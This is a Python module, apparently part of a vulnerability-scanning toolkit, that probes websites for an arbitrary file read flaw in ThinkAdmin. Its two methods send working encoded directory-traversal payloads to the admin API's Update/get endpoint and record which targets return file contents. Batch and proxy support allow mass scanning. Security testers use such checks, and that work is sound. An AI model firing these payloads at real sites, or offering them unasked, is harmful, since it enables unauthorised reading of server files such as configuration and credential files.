##! /usr/bin/python3
# -*- encoding: utf-8 -*-
import requests,urllib3
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc,OutPrintInfoErr
from pub.com.reqset import ReqSet
from pub.com.output import OutPutFile
urllib3.disable_warnings()

class ThinkAdmin_File_Read_Scan:
    def get_url(self,input_url):
        try:
            url = input_url + "/admin.html?s=admin/api.Update/get/encode/34392q302x2r1b37382p382x2r1b1a1a1b1a1a1b2r33322u2x2v1b2s2p382p2q2p372t0y342w34"
            req = requests.get(url,headers=self.headers,proxies=self.proxy,verify=self.ssl)
            if "读取文件成功" in req.text:
                OutPrintInfoSuc("ThinkAdmin", f'目标存在ThinkAdmin任意文件读取漏洞: {url}')
                if self.batch:
                    OutPutFile("thinkadmin_file_read.txt",f'目标存在ThinkAdmin任意文件读取漏洞: {url}')

                return True
            else:
                if not self.batch:
                    OutPrintInfo("ThinkAdmin", f'目标不存在ThinkAdmin任意文件读取漏洞')
                return False
        except Exception as e:
            if not self.batch:
                OutPrintInfo("ThinkAdmin",'目标请求出错')
            return False
    def get_url2(self,input_url):
        try:
            url = input_url + "/admin.html?s=admin/api.Update/get/encode/34392q302x2r1b37382p382x2r1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b2t382r1b342p37373b2s"
            req = requests.get(url,headers=self.headers,proxies=self.proxy,verify=self.ssl)
            if "读取文件成功" in req.text:
                OutPrintInfoSuc("ThinkAdmin", f'目标存在ThinkAdmin任意文件读取漏洞: {url}')
                if self.batch:
                    OutPutFile("thinkadmin_file_read.txt",f'目标存在ThinkAdmin任意文件读取漏洞: {url}')

                return True
            else:
                if not self.batch:
                    OutPrintInfo("ThinkAdmin", f'目标不存在ThinkAdmin任意文件读取漏洞')
                return False
        except Exception as e:
            if not self.batch:
                OutPrintInfo("ThinkAdmin",'目标请求出错')
            return False


    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        header = target["header"]
        self.ssl = target["ssl"]
        proxy = target["proxy"]
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("ThinkAdmin", '开始检测ThinkAdmin任意文件读取漏洞...')
        self.get_url(url)
        self.get_url2(url)
        if not self.batch:
            OutPrintInfo("ThinkAdmin", 'ThinkAdmin任意文件读取漏洞检测结束')

